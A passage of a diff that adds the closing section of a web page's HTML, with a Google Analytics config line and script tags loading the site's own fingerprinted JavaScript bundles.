+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
